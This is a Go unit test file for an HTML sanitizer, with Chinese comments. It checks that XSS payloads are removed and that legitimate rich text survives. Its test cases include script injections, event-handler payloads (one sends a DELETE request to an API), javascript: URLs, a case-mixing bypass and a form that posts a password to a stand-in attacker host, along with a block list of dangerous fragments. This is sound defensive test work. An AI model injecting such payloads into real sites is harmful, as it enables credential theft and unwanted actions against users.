package sanitize

import (
	"strings"
	"testing"
)

// TestHTMLStripsXSSPayloads 验证典型 XSS 载荷被剥除（BUG-001 复现路径）：
// script（含内容）、on* 事件属性、javascript: URL、iframe/svg、style 属性/标签、表单元素。
func TestHTMLStripsXSSPayloads(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{"script标签连内容", `<p>正文</p><script>alert('xss')</script>`},
		{"img-onerror事件属性", `<img src="x.png" onerror="fetch('/api/source',{method:'DELETE'})">`},
		{"img-onload事件属性", `<img src="x.png" onload="alert(1)">`},
		{"svg-onload", `<svg onload="alert(1)"><circle r="1"/></svg>`},
		{"a-href-javascript", `<a href="javascript:alert(1)">点我</a>`},
		{"iframe-srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`},
		{"style标签", `<style>body{background:url(javascript:alert(1))}</style>`},
		{"内联style属性", `<p style="color:red;background:url(javascript:alert(1))">文本</p>`},
		{"表单元素", `<form action="https://evil.example/steal"><input name="pwd" type="password"></form>`},
		{"大小写混合绕过", `<IMG SRC=x OnErRoR=alert(1)>`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out := HTML(c.in)
			lower := strings.ToLower(out)
			for _, bad := range []string{
				"<script", "onerror", "onload", "javascript:", "<iframe", "srcdoc",
				"<svg", "<style", "style=", "<form", "<input", "alert(",
			} {
				if strings.Contains(lower, bad) {
					t.Fatalf("净化后仍含危险片段 %q\n输入: %s\n输出: %s", bad, c.in, out)
				}
			}
		})
	}
}

// TestHTMLKeepsReadingStructure 验证合法富文本结构被保留：
// 标题/段落/加粗/链接/图片（src/alt/尺寸）/列表/表格/引用/代码块。
// <img src> 是图墙封面兜底与 PicViewer 的硬依赖（view-modes.md D1），必须保留。
func TestHTMLKeepsReadingStructure(t *testing.T) {
	in := `<h2>小节标题</h2><p>段落<strong>加粗</strong><em>强调</em></p>` +
		`<a href="https://example.com/post?a=1&amp;b=2" title="原文地址">原文链接</a>` +
		`<img src="https://example.com/pic.png" alt="图片描述" width="600" height="400">` +
		`<ul><li>无序项</li></ul><ol><li>有序项</li></ol>` +
		`<table><thead><tr><th>表头</th></tr></thead><tbody><tr><td>单元格</td></tr></tbody></table>` +
		`<blockquote>引用内容</blockquote><pre><code>x := 1</code></pre><figure><figcaption>图注</figcaption></figure>`
	out := HTML(in)
	for _, want := range []string{
		"<h2>小节标题</h2>",
		"<p>段落<strong>加粗</strong><em>强调</em></p>",
		`href="https://example.com/post?a=1&amp;b=2"`,
		`src="https://example.com/pic.png"`,
		`alt="图片描述"`,
		`width="600"`, `height="400"`,
		"<ul><li>无序项</li></ul>",
		"<ol><li>有序项</li></ol>",
		"<th>表头</th>", "<td>单元格</td>",
		"<blockquote>引用内容</blockquote>",
		"<pre><code>x := 1</code></pre>",
		"<figure><figcaption>图注</figcaption></figure>",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("净化后丢失合法片段 %q\n输出: %s", want, out)
		}
	}
}

// TestHTMLKeepsRelativeImageSrc 验证相对地址图片存活（封面三级兜底按 entry.url 解析）。
func TestHTMLKeepsRelativeImageSrc(t *testing.T) {
	out := HTML(`<p><img src="/static/img/cover.webp" alt="封面"></p>`)
	if !strings.Contains(out, `src="/static/img/cover.webp"`) {
		t.Fatalf("相对地址图片 src 被丢弃: %s", out)
	}
}

// TestHTMLDropsDataURLAndUnknownSchemes 验证 data:/vbscript: 等非常见协议 URL 被丢弃。
func TestHTMLDropsDataURLAndUnknownSchemes(t *testing.T) {
	out := HTML(`<img src="data:image/png;base64,iVBORw0KGgo="><a href="vbscript:msgbox(1)">x</a>`)
	lower := strings.ToLower(out)
	for _, bad := range []string{"data:", "vbscript"} {
		if strings.Contains(lower, bad) {
			t.Fatalf("非常见协议 URL 存活: %s", out)
		}
	}
}

// TestHTMLEmptyPassthrough 验证空串短路返回。
func TestHTMLEmptyPassthrough(t *testing.T) {
	if got := HTML(""); got != "" {
		t.Fatalf("空串净化结果 = %q, want \"\"", got)
	}
}
